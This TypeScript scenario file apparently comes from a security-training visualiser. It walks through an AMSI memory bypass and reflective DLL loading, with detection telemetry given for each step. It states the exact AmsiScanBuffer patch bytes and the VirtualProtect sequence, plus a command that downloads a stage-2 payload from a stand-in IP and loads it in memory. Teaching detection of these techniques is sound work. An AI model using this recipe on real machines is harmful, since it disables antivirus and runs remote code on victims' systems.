import { AMSI_REFLECTIVE_DLL_TELEMETRY } from './telemetry';
import type { AttackScenario } from '../types';
import type { RawScenarioStepGuideData } from '@/modules/scenarios/contracts';

export const scenario: AttackScenario = {
  id: 'amsi-reflective-dll',
  code: 'T1562.001 / T1620',
  name: 'Fileless AMSI Memory Bypass & Reflective DLL Injection',
  shortSubtitle: 'Malware Analysis · amsi.dll 6-Byte Patch & In-Memory CLR Load',
  category: 'MALWARE',
  severity: 'CRITICAL',
  primaryMitrePhase: 4,
  overview:
    'In Fileless AMSI Memory Bypass & Reflective DLL Injection (MITRE ATT&CK T1562.001 and T1620), a malicious Word document launches hidden PowerShell on WKS-FIN-09 to blind the in-process Antimalware Scan Interface before loading a stage-2 payload strictly in volatile RAM. The arc: resolve AmsiScanBuffer inside PowerShell, unlock the signed code page for writing, overwrite its opening six bytes so future scans return an immediate error without calling Defender, then download and execute a reflective assembly with zero bytes touching disk. Steps #1-#3 cover AMSI memory sabotage; Step #4 covers zero-disk reflective execution; Memory compares live RAM against the signed disk file. Primary detection: PowerShell Script Block Event ID 4104, kernel EtwTiLogProtectVM protection flips, and .NET Runtime ETW Event ID 152.',
  specs: [
    { term: 'MITRE TECHNIQUES', value: 'T1562.001 (AMSI Bypass) · T1620 (Reflective Code Loading)' },
    { term: 'KEY WIN32 APIS', value: 'LoadLibrary, GetProcAddress, VirtualProtect, Marshal.Copy, Assembly.Load' },
    { term: 'DETECTION SOURCES', value: 'PowerShell EID 4104 · Kernel ETW-Ti ProtectVM · Sysmon EID 1/3 · CLR ETW 152' },
    { term: 'TARGET PROCESS', value: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe (PID: 5412)' },
    { term: 'PATCH SIGNATURE', value: 'B8 57 00 07 80 C3 (mov eax, 0x80070057 [E_INVALIDARG]; ret)' },
    { term: 'DISK FOOTPRINT', value: '0 Bytes Written to NTFS (Zero Sysmon Event ID 11 FileCreate)' },
  ],
  nodes: [
    {
      id: 'c2_stager',
      label: 'HTTPS Payload Stager',
      sublabel: '198.51.100.74:443 (TLS 1.3)',
      role: 'attacker',
      x: 16,
      y: 52,
      details: {
        osOrType: 'External HTTPS Stage-2 Stager',
        pidOrPort: 'TCP/443 (WebClient.DownloadData)',
        privilege: 'External Threat Actor',
        artifacts: ['GET /assets/stage2.bin (184 KB)', 'Encrypted Reflective CLR / DLL Byte Array'],
        description:
          'External HTTPS server hosting the stage-2 reflective assembly that PowerShell pulls directly into a volatile RAM byte array once AMSI is blinded.',
      },
    },
    {
      id: 'winword_stager',
      label: 'winword.exe',
      sublabel: 'PID 3820 (Macro Launcher)',
      role: 'attacker',
      x: 38,
      y: 28,
      details: {
        osOrType: 'Microsoft Word Macro Host (WKS-FIN-09)',
        pidOrPort: 'PID 3820 · PPID 2188 (explorer.exe)',
        privilege: 'Medium Integrity (CORP\\a.miller)',
        artifacts: ['Q4_Budget_Review.docm', 'Spawns powershell.exe -NoP -W Hidden -Enc'],
        description:
          'Weaponized Office document on workstation WKS-FIN-09 (10.10.4.27) spawning a hidden encoded PowerShell interpreter to initiate the fileless chain.',
      },
    },
    {
      id: 'powershell_host',
      label: 'powershell.exe',
      sublabel: 'PID 5412 (User-Mode Host)',
      role: 'process',
      x: 56,
      y: 62,
      details: {
        osOrType: 'Windows PowerShell 5.1 Host + CLR',
        pidOrPort: 'PID 5412 · WKS-FIN-09 (10.10.4.27)',
        privilege: 'Medium Integrity · Unbacked RWX',
        artifacts: [
          'amsi.dll loaded in same address space',
          '[System.Reflection.Assembly]::Load($bytes)',
          'Reflective PE @ 0x000001E4A2100000',
        ],
        description:
          'Trusted Windows scripting process hosting both the attacker script and amsi.dll inside the same writable user-mode address space.',
      },
    },
    {
      id: 'amsi_memory',
      label: 'amsi.dll Memory',
      sublabel: '0x7FF9C2142840 (Patched)',
      role: 'memory',
      x: 76,
      y: 66,
      details: {
        osOrType: 'Signed User-Mode AMSI Library (CoW Dirty)',
        pidOrPort: 'amsi.dll!AmsiScanBuffer · 6-Byte Patch',
        privilege: 'VirtualProtect 0x20 -> 0x40 -> 0x20',
        artifacts: [
          'Original: 4C 8B DC 49 89 5B',
          'Patched: B8 57 00 07 80 C3 (E_INVALIDARG)',
          'MpOav.dll Defender scan bypassed',
        ],
        description:
          'User-mode Antimalware Scan Interface DLL inside powershell.exe whose AmsiScanBuffer prologue is short-circuited to return E_INVALIDARG.',
      },
    },
    {
      id: 'etw_edr_sensor',
      label: 'PowerShell 4104 & ETW-Ti',
      sublabel: 'EID 4104 / ProtectVM / CLR 152',
      role: 'firewall_siem',
      x: 80,
      y: 26,
      details: {
        osOrType: 'Kernel ETW-Ti + PowerShell Operational Log',
        pidOrPort: 'SIEM Correlation Pipeline',
        privilege: 'SYSTEM / Kernel Telemetry',
        artifacts: [
          'PowerShell EID 4104 (pre-bypass script block)',
          'EtwTiLogProtectVM (RX -> RWX on amsi.dll)',
          '.NET ETW EID 152 (empty-path AssemblyLoad)',
        ],
        description:
          'Kernel and script-block telemetry sources that survive the user-mode AMSI bypass and expose both the memory protection flip and the fileless assembly load.',
      },
    },
  ],
  processTree: [
    {
      pid: 2188,
      ppid: 1420,
      name: 'explorer.exe',
      commandLine: 'C:\\Windows\\Explorer.EXE',
      user: 'CORP\\a.miller',
      integrity: 'Medium',
      status: 'normal',
      activeFromStage: 1,
      apiCalls: ['ShellExecuteExW'],
    },
    {
      pid: 3820,
      ppid: 2188,
      name: 'winword.exe',
      commandLine: '"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" "Q4_Budget_Review.docm"',
      user: 'CORP\\a.miller',
      integrity: 'Medium',
      status: 'malicious',
      activeFromStage: 1,
      apiCalls: ['CreateProcessW(powershell.exe -NoP -W Hidden -Enc ...)'],
    },
    {
      pid: 5412,
      ppid: 3820,
      name: 'powershell.exe',
      commandLine: 'powershell.exe -NoP -W Hidden -Enc JABoAD0AWwBLAGUAcgBuAGUAbAAzADIAXQA6ADoATABvAGEAZABMAGkAYgByAGEAcgB5ACgAIgBhAG0AcwBpAC4AZABsAGwAIgApAA==',
      user: 'CORP\\a.miller',
      integrity: 'Medium',
      status: 'hollowed',
      activeFromStage: 1,
      apiCalls: [
        'LoadLibraryA("amsi.dll")',
        'GetProcAddress(hAmsi, "AmsiScanBuffer")',
        'VirtualProtect(0x7FF9C2142840, 6, PAGE_EXECUTE_READWRITE)',
        'Marshal.Copy(B8 57 00 07 80 C3)',
        'VirtualProtect(0x7FF9C2142840, 6, PAGE_EXECUTE_READ)',
        'WebClient.DownloadData(198.51.100.74:443)',
        'Assembly.Load($bytes)',
      ],
      memoryBlocks: [
        {
          address: '0x7FF9C2142840',
          section: 'amsi.dll (.text CoW Dirty)',
          permissions: 'R-X',
          size: '4 KB',
          status: 'injected',
          description:
            'Copy-on-Write dirty private page inside signed amsi.dll!.text where the opening six bytes of AmsiScanBuffer were overwritten with B8 57 00 07 80 C3 (mov eax, 0x80070057; ret) so every scan immediately returns E_INVALIDARG before reaching Windows Defender, then restored to PAGE_EXECUTE_READ (0x20) to blend in with normal code pages.',
          hexPreview: 'B8 57 00 07 80 C3 55 56 57 41 54 41 55 41 56 41  .W....UVWATAUAVA',
        },
        {
          address: '0x000001E4A2100000',
          section: 'Unbacked Reflective PE/CLR',
          permissions: 'RWX',
          size: '184 KB',
          status: 'shellcode',
          description:
            'Unbacked MEM_PRIVATE PAGE_EXECUTE_READWRITE (0x40) memory region allocated strictly in volatile RAM by ReflectiveLoader and [System.Reflection.Assembly]::Load($bytes), holding a full MZ/PE executable image and resolved import table with zero backing file path on the NTFS disk.',
          hexPreview: '4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00  MZ..............',
        },
        {
          address: '0x000001E4A2150000',
          section: 'CLR Managed Assembly Heap',
          permissions: 'RW-',
          size: '96 KB',
          status: 'injected',
          description:
            'Managed .NET CLR heap inside powershell.exe holding the decrypted stage-2 tasking configuration and reflective object metadata after Assembly.Load completes without triggering Sysmon Event ID 11 file creation.',
          hexPreview: '53 74 61 67 65 32 52 65 63 6F 6E 00 01 00 00 00  Stage2Recon.....',
        },
      ],
    },
  ],
  stages: [
    {
      index: 1,
      title: 'ENCODED POWERSHELL STAGER & AMSI ADDRESS LOOKUP',
      subtitle: 'Locating amsi.dll!AmsiScanBuffer inside powershell.exe RAM',
      description:
        'Launching from a weaponized Word document (winword.exe PID 3820), a hidden Base64-encoded PowerShell session (PID 5412) runs inside the same user-mode memory room where Windows automatically loads amsi.dll (the Antimalware Scan Interface library that inspects scripts before execution). Calling LoadLibrary("amsi.dll") and GetProcAddress(hAmsi, "AmsiScanBuffer") locates the live inspection routine at 0x7FF9C2142840, while PowerShell Operational Event ID 4104 automatically records the full de-obfuscated script block before AMSI is disabled.',
      mitreTacticPhase: 2,
      mitreTechniqueId: 'T1059.001',
      mitreTechniqueName: 'Command and Scripting Interpreter: PowerShell',
      activeNodeIds: ['winword_stager', 'powershell_host', 'amsi_memory', 'etw_edr_sensor'],
      compromisedNodeIds: ['winword_stager', 'powershell_host'],
      keySpecs: [
        { term: 'PARENT -> CHILD', value: 'winword.exe (3820) -> powershell.exe (5412)' },
        { term: 'RESOLVED ADDRESS', value: 'amsi.dll!AmsiScanBuffer @ 0x7FF9C2142840' },
        { term: 'PRE-BYPASS LOG', value: 'PowerShell Operational Event ID 4104' },
      ],
    },
    {
      index: 2,
      title: 'VIRTUALPROTECT MEMORY GUARD UNLOCK (RX -> RWX)',
      subtitle: 'Flipping amsi.dll!.text from 0x20 to 0x40 via Copy-on-Write',
      description:
        'Because signed code pages inside amsi.dll!.text are normally protected as PAGE_EXECUTE_READ (0x20, allowing the CPU to execute instructions while blocking writes), the script cannot edit AmsiScanBuffer directly. Invoking kernel32!VirtualProtect(0x7FF9C2142840, 6, PAGE_EXECUTE_READWRITE [0x40], &oldProtect) triggers Windows Copy-on-Write to fork a private writable copy of the 4 KB page for PID 5412 alone, while simultaneously firing kernel ETW Threat Intelligence telemetry (EtwTiLogProtectVM).',
      mitreTacticPhase: 4,
      mitreTechniqueId: 'T1562.001',
      mitreTechniqueName: 'Impair Defenses: Disable or Modify Tools',
      activeNodeIds: ['powershell_host', 'amsi_memory', 'etw_edr_sensor'],
      compromisedNodeIds: ['winword_stager', 'powershell_host', 'amsi_memory'],
      keySpecs: [
        { term: 'WIN32 API', value: 'VirtualProtect(0x7FF9C2142840, 6, 0x40, &old)' },
        { term: 'PROTECTION FLIP', value: 'PAGE_EXECUTE_READ (0x20) -> RWX (0x40)' },
        { term: 'KERNEL TELEMETRY', value: 'ETW-Ti EtwTiLogProtectVM (Copy-on-Write)' },
      ],
    },
    {
      index: 3,
      title: '6-BYTE PROLOGUE SHORT-CIRCUIT PATCH & RE-LOCK',
      subtitle: 'Writing B8 57 00 07 80 C3 (E_INVALIDARG) and restoring RX',
      description:
        'With the 4 KB page unlocked, Marshal.Copy overwrites the first six instruction bytes of AmsiScanBuffer (4C 8B DC 49 89 5B) with B8 57 00 07 80 C3, which decodes to mov eax, 0x80070057; ret (returning HRESULT E_INVALIDARG immediately). A second VirtualProtect call restores PAGE_EXECUTE_READ (0x20) to hide the writable state, leaving every subsequent PowerShell scan short-circuited locally so Windows Defender (MpOav.dll) never receives the buffer.',
      mitreTacticPhase: 4,
      mitreTechniqueId: 'T1562.001',
      mitreTechniqueName: 'Impair Defenses: AMSI Memory Patching',
      activeNodeIds: ['powershell_host', 'amsi_memory', 'etw_edr_sensor'],
      compromisedNodeIds: ['winword_stager', 'powershell_host', 'amsi_memory'],
      keySpecs: [
        { term: 'ORIGINAL BYTES', value: '4C 8B DC 49 89 5B (mov r11, rsp; mov [r11+8], rbx)' },
        { term: 'PATCHED BYTES', value: 'B8 57 00 07 80 C3 (mov eax, 0x80070057; ret)' },
        { term: 'POST-PATCH STATE', value: 'Restored 0x20 RX · Dirty Private Page Mismatch' },
      ],
    },
    {
      index: 4,
      title: 'ZERO-DISK DOWNLOAD & IN-MEMORY REFLECTIVE LOAD',
      subtitle: 'WebClient.DownloadData + [Assembly]::Load($bytes) in MEM_PRIVATE RWX',
      description:
        'Now blind to AMSI inspection, PowerShell downloads the 184 KB stage-2 payload from 198.51.100.74:443 straight into a RAM byte array via WebClient.DownloadData without writing a single byte to NTFS (so Sysmon Event ID 11 FileCreate never fires). Passing that byte array into [System.Reflection.Assembly]::Load($bytes) and ReflectiveLoader maps an unbacked MEM_PRIVATE RWX PE/CLR image at 0x000001E4A2100000, resolves relocations and imports in memory, and executes directly inside powershell.exe while Sysmon Event ID 3 and .NET Runtime ETW Event ID 152 expose the fileless load.',
      mitreTacticPhase: 4,
      mitreTechniqueId: 'T1620',
      mitreTechniqueName: 'Reflective Code Loading',
      activeNodeIds: ['c2_stager', 'powershell_host', 'etw_edr_sensor'],
      compromisedNodeIds: ['c2_stager', 'winword_stager', 'powershell_host', 'amsi_memory'],
      keySpecs: [
        { term: 'NETWORK PULL', value: 'Sysmon EID 3 -> 198.51.100.74:443 (184 KB)' },
        { term: 'MEMORY BASE', value: '0x000001E4A2100000 (Unbacked MEM_PRIVATE RWX)' },
        { term: 'FILELESS PROOF', value: '0 Bytes on Disk (No EID 11) · CLR ETW EID 152' },
      ],
    },
  ],
  telemetry: AMSI_REFLECTIVE_DLL_TELEMETRY,
};

export const stepGuide: RawScenarioStepGuideData = {
  scenarioId: 'amsi-reflective-dll',
  briefing: {
    headline:
      'Scenario Briefing: Fileless AMSI Memory Bypass & Reflective DLL Injection (MITRE T1562.001 / T1620)',
    storyAnalogy:
      'Picture a glass-walled precision workshop that has its own automated X-Ray inspection belt built right inside the room, wired up to an elevated security watchtower overhead. Normally, whenever a red contraband canister slides onto the belt, the X-Ray scanner triggers a loud siren and slams a heavy steel drop-gate shut. Because the scanner circuit panel sits inside the exact same room as the workbench, a covert technician simply walks over, unbolts the blue glass safety hatch with a brass master wrench, pulls out all six copper inspection fuses, snaps in a single six-pin brass short-circuit jumper that cuts off the watchtower cable, and shuts the glass hatch again. Then, without ever unlocking the warehouse floor door or tipping the digital floor scale past zero kilograms, an overhead pneumatic air-tube drops floating parts onto a mid-air levitation ring where they snap together into a live hovering drone while the watchtower upstairs still reads all clear.',
    plainSummary:
      'In this scenario (T1562.001 and T1620, Fileless AMSI Memory Bypass & Reflective DLL Injection) on WKS-FIN-09, a hidden PowerShell session spawned by Microsoft Word sabotages its own in-process Antimalware Scan Interface before loading a stage-2 payload strictly in volatile RAM. The attack unfolds in one continuous arc: locating the live scanner function in process memory, unlocking its read-only code page, overwriting six opening instruction bytes so every future scan returns an immediate skip result, and finally streaming a reflective assembly straight from HTTPS into unbacked RAM with zero disk writes. Steps #1-#4 walk that complete kill chain end-to-end, while Memory Forensics compares live patched pages and unbacked executable RAM against the clean disk. Primary detection correlates PowerShell Script Block Event ID 4104 with kernel memory-protection telemetry and empty-path CLR assembly load events.',
    diagramTopologySummary:
      'On the diagram: Start at Node ② (winword.exe PID 3820) launching Node ③ (powershell.exe PID 5412), trace Steps #1 through #3 patching Node ④ (amsi.dll Memory at 0x7FF9C2142840) while Node ⑤ (PowerShell 4104 & ETW-Ti) records the tamper witnesses, and watch Step #4 pull the reflective payload from Node ① (HTTPS Payload Stager 198.51.100.74:443) straight into unbacked RAM.',
    documentedAdvisory:
      'Microsoft AMSI Architecture · PowerShell Operational EID 4104 · Kernel ETW-Ti ProtectVM · MITRE T1562.001 & T1620',
  },
  steps: [
    {
      stepNumber: 1,
      mitreId: 'T1059.001',
      plainTitle: 'Launching Encoded PowerShell & Locating the Live X-Ray Scanner Address in RAM',
      storyAnalogy:
        'A covert technician enters the precision workshop from an executive mail chute and walks straight to the workshop console. Because the automated X-Ray inspection belt shares the exact same room as the workbench, the technician checks the brass serial plaque mounted on the scanner cabinet to pinpoint the exact circuit box address they need to disable, while an overhead mechanical paper-tape printer quietly clicks and reels out a permanent transcript of their entire preparation plan.',
      simpleExplanation:
        'The attacker starts on workstation WKS-FIN-09 (10.10.4.27, running under standard user CORP\\a.miller) by having a macro inside winword.exe (PID 3820, Microsoft Word opening a weaponized document) spawn powershell.exe (PID 5412, launched with -NoP -W Hidden -Enc flags so no profile loads and no console window flashes on screen). Because Windows loads amsi.dll (the Antimalware Scan Interface library that hands script text to Windows Defender before execution) directly inside the PowerShell process itself, the attacker script shares the exact same user-mode memory room as its own guard. To pinpoint that guard, the script uses .NET P/Invoke (a built-in bridge that lets PowerShell call raw Windows C functions directly) to run LoadLibrary("amsi.dll") (returning the live handle of the loaded scanner library inside PID 5412) followed by GetProcAddress(hAmsi, "AmsiScanBuffer") (which looks up the exact export table entry and returns the live virtual address 0x7FF9C2142840 where every future scan begins). Crucially, because AMSI is still active during this setup step, PowerShell Script Block Logging automatically records the full de-obfuscated P/Invoke commands in Event ID 4104 before the bypass takes effect.',
      howItWorksInPractice:
        'When PowerShell compiles an inline C# helper or reflects kernel32.dll exports (using GetModuleHandle or LoadLibraryA paired with GetProcAddress inside the same process address space), Windows resolves the exact runtime address of amsi.dll!AmsiScanBuffer (0x7FF9C2142840 on this boot after Address Space Layout Randomization shifts DLL bases per restart) without needing administrator privileges or cross-process handles because every user-mode thread owns full visibility over DLLs mapped into its own virtual address space. Before execution of that script block even begins, the PowerShell engine automatically decodes the Base64 -Enc wrapper and emits the plaintext script block to Microsoft-Windows-PowerShell/Operational Event ID 4104 (capturing the suspicious combination of amsi.dll, AmsiScanBuffer, GetProcAddress, and VirtualProtect even when the script tries to hide behind string concatenation or encoding).',
      diagramAlignment:
        'On the diagram, look at Step #1 flowing from Node ② (winword.exe PID 3820) into Node ③ (powershell.exe PID 5412) and resolving Node ④ (amsi.dll Memory @ 0x7FF9C2142840) while Node ⑤ (PowerShell 4104 & ETW-Ti) captures the pre-bypass script block.',
      detectionAndEvidence:
        'Documented in Sysmon Event ID 1 (ProcessCreate flagging winword.exe PID 3820 spawning hidden encoded powershell.exe PID 5412) correlated with PowerShell Operational Event ID 4104 (Script Block Logging capturing the full decoded P/Invoke lookup for amsi.dll and AmsiScanBuffer before AMSI is patched).',
    },
    {
      stepNumber: 2,
      mitreId: 'T1562.001',
      plainTitle: 'Unlocking the Read-Only Scanner Code Page With VirtualProtect (RX to RWX)',
      storyAnalogy:
        'Reaching the side of the X-Ray scanner cabinet, the technician finds the six inspection fuses locked behind a heavy bolted blue glass safety hatch that prevents anyone from touching the live wires. Fitting a brass master wrench onto the hex bolt, the technician twists the lock until the blue tamper seal fractures, swinging the glass hatch open under an amber unlocked glow, while a hidden violet ultraviolet sensor on the hinge flashes an unmistakable forensic beacon up to the control room.',
      simpleExplanation:
        'Even though PowerShell now knows the exact live address of AmsiScanBuffer (0x7FF9C2142840, located inside its own memory room in Step #1), Windows protects signed executable code pages with PAGE_EXECUTE_READ = 0x20 permissions (known as RX, which allows the CPU to run machine instructions while immediately crashing any thread that attempts to overwrite those bytes). To swing open that "bolted blue glass safety hatch", the script invokes kernel32!VirtualProtect(0x7FF9C2142840, 6, PAGE_EXECUTE_READWRITE [0x40], &oldProtect) (Windows user-mode API for changing read, write, and execute permissions on an existing memory page inside the current process, requesting 0x40 RWX so the first six bytes become writable right now while staying executable). Windows honors the call by creating a private writable Copy-on-Write copy of that 4 KB page for powershell.exe PID 5412 alone (leaving every other process on the machine untouched), while the Windows kernel immediately emits a high-priority threat-intelligence event recording the exact instant signed amsi.dll became writable.',
      howItWorksInPractice:
        'Under the hood, kernel32!VirtualProtect calls ntdll!NtProtectVirtualMemory (the native syscall that enters the Windows kernel memory manager to update Page Table Entries for the target 4 KB page containing 0x7FF9C2142840). Because amsi.dll is mapped as a shared file-backed SEC_IMAGE section across dozens of running processes, flipping its protection from PAGE_EXECUTE_READ (0x20) to PAGE_EXECUTE_READWRITE (0x40) triggers hardware Copy-on-Write (allocating a brand-new private physical RAM page exclusively for PID 5412 so the attacker edit does not corrupt amsi.dll globally). At the exact same instant inside Ring 0, Microsoft-Windows-Threat-Intelligence fires EtwTiLogProtectVM (a tamper-resistant kernel telemetry callback that user-mode AMSI patches cannot silence), logging OldProtection = 0x20, NewProtection = 0x40, and TargetModule = C:\\Windows\\System32\\amsi.dll.',
      diagramAlignment:
        'On the diagram, follow Step #2 from Node ③ (powershell.exe PID 5412) to Node ④ (amsi.dll Memory @ 0x7FF9C2142840) flipping protection from 0x20 RX to 0x40 RWX and alerting Node ⑤ (PowerShell 4104 & ETW-Ti via EtwTiLogProtectVM).',
      detectionAndEvidence:
        'Documented in Kernel ETW Threat-Intelligence (EtwTiLogProtectVM logging powershell.exe PID 5412 flipping signed C:\\Windows\\System32\\amsi.dll at 0x7FF9C2142840 from PAGE_EXECUTE_READ 0x20 to PAGE_EXECUTE_READWRITE 0x40) paired with Sysmon Event ID 7 (ImageLoaded confirming amsi.dll inside PID 5412).',
    },
    {
      stepNumber: 3,
      mitreId: 'T1562.001',
      plainTitle: 'Short-Circuiting AmsiScanBuffer With a 6-Byte Prologue Patch & Re-Locking RX',
      storyAnalogy:
        'Inside the wide-open X-Ray side circuit box, the technician pulls out all six live glowing copper inspection fuses and snaps a single solid six-pin brass U-shaped jumper directly into the empty sockets. The instant the brass jumper seats, the overhead copper alarm cable climbing to the elevated watchtower goes completely dark and silent, any incoming test pulse bounces straight back as an instant skip, and the technician swings the blue glass hatch shut again so the cabinet looks normal from across the room.',
      simpleExplanation:
        'With the 4 KB page at 0x7FF9C2142840 unlocked to RWX (0x40, opened in Step #2 so writes will succeed without crashing PowerShell), the script calls Marshal.Copy (a built-in .NET utility that copies raw bytes from a managed array directly to an unmanaged memory pointer) to overwrite the opening six bytes of AmsiScanBuffer (replacing the original Microsoft prologue 4C 8B DC 49 89 5B with B8 57 00 07 80 C3). Those six replacement bytes decode on x64 CPUs to just two instructions: mov eax, 0x80070057 followed immediately by ret (loading HRESULT code E_INVALIDARG into the return register EAX and exiting the function at once before it ever invokes the Windows Defender provider MpOav.dll). Because PowerShell treats E_INVALIDARG from AMSI as an unscannable non-malicious result and continues running, the attacker has completely blinded antivirus inspection inside PID 5412. Finally, the script calls VirtualProtect a second time to restore PAGE_EXECUTE_READ (0x20, closing the blue glass hatch so memory scanners hunting for currently writable DLL code pages miss the patch at a glance).',
      howItWorksInPractice:
        'In clean x64 execution, AmsiScanBuffer begins with 4C 8B DC 49 89 5B (mov r11, rsp; mov [r11+0x8], rbx, setting up the stack frame before validating the AMSI context and forwarding the script buffer via COM to Windows Defender provider MpOav.dll). Overwriting those exact six bytes with B8 57 00 07 80 C3 (mov eax, 0x80070057; ret) short-circuits the function on its very first CPU instruction cycle so MpOav.dll is never called again for the lifetime of PID 5412. Even after the second VirtualProtect call restores PAGE_EXECUTE_READ (0x20), the modified page remains a private Copy-on-Write dirty page in the kernel Working Set whose live bytes no longer match C:\\Windows\\System32\\amsi.dll on disk, giving EDR memory integrity scanners a deterministic proof of tampering.',
      diagramAlignment:
        'On the diagram, Step #3 modifies Node ④ (amsi.dll Memory @ 0x7FF9C2142840) inside Node ③ (powershell.exe PID 5412), overwriting 6 bytes to B8 57 00 07 80 C3 and re-locking to 0x20 while Node ⑤ (PowerShell 4104 & ETW-Ti) detects the dirty page integrity diff.',
      detectionAndEvidence:
        'Documented in EDR Memory Integrity Audits (comparing live amsi.dll!.text bytes B8 57 00 07 80 C3 against clean on-disk 4C 8B DC 49 89 5B inside PID 5412) and Kernel ETW-Ti (EtwTiLogProtectVM recording the matching 0x40 -> 0x20 protection restore transition).',
    },
    {
      stepNumber: 4,
      mitreId: 'T1620',
      plainTitle: 'Zero-Disk HTTPS Download & In-Memory Reflective Assembly Execution',
      storyAnalogy:
        'With the watchtower upstairs completely dark and showing all clear, the warehouse receiving door stays padlocked and its digital floor scale stays flat at zero kilograms. Instead of wheeling anything across the floor, an overhead pneumatic glass air-tube drops glowing metallic components straight onto a hovering levitation ring in mid-air; a test scan pulse hits the rigged brass jumper and bounces harmlessly away with the drop-gate wide open while the floating parts snap together mid-air into an armed spinning reconnaissance drone.',
      simpleExplanation:
        'Now that AmsiScanBuffer returns E_INVALIDARG on every call (cutting off Windows Defender inside PID 5412), PowerShell can download and execute an entire stage-2 malware payload without ever touching the hard drive. First, the script runs (New-Object System.Net.WebClient).DownloadData("https://198.51.100.74/assets/stage2.bin") (pulling the 184 KB binary over encrypted HTTPS directly into a managed byte array in RAM rather than saving a file to NTFS, so file-based antivirus and Sysmon Event ID 11 FileCreate never see a single byte touch disk). Next, calling [System.Reflection.Assembly]::Load($bytes) or an in-memory ReflectiveLoader stub allocates an unbacked MEM_PRIVATE PAGE_EXECUTE_READWRITE (0x40) memory region at 0x000001E4A2100000 (volatile RAM completely detached from any file on disk), manually maps PE sections, fixes base relocations and Import Address Table pointers in place, and invokes the payload entry point right inside powershell.exe.',
      howItWorksInPractice:
        'Standard Windows DLL loading through LoadLibraryW requires an on-disk file handle backed by NTFS (generating Sysmon Event ID 11 FileCreate and ImageLoad events with a valid disk path). By contrast, Microsoft .NET [System.Reflection.Assembly]::Load(byte[]) and native ReflectiveLoader stubs parse the MZ/PE headers (4D 5A 90 00) directly inside an anonymous MEM_PRIVATE allocation at 0x000001E4A2100000, leaving the on-disk file table untouched (0.0 kg on the warehouse scale). Even though disk-based alerts stay silent, two high-fidelity runtime signals still catch the intrusion: Sysmon Event ID 3 logs powershell.exe PID 5412 opening an outbound TLS 1.3 connection to 198.51.100.74:443, and Microsoft-Windows-DotNETRuntime ETW Event ID 152 (AssemblyLoad) records a newly loaded CLR assembly whose FullyQualifiedPath field is completely empty alongside an unbacked RWX PE header in RAM.',
      diagramAlignment:
        'On the diagram, Step #4 pulls the 184 KB reflective payload from Node ① (HTTPS Payload Stager 198.51.100.74:443) directly into Node ③ (powershell.exe PID 5412 RAM @ 0x000001E4A2100000) while Node ⑤ (PowerShell 4104 & ETW-Ti) correlates Sysmon EID 3 with CLR ETW EID 152.',
      detectionAndEvidence:
        'Documented in Sysmon Event ID 3 (NetworkConnect capturing powershell.exe PID 5412 downloading from 198.51.100.74:443) correlated with Microsoft-Windows-DotNETRuntime ETW Event ID 152 (in-memory AssemblyLoad with empty disk path) and memory scans flagging unbacked MEM_PRIVATE RWX MZ headers at 0x000001E4A2100000 with zero Sysmon Event ID 11.',
    },
  ],
};

export * from './choreography';
export * from './telemetry';
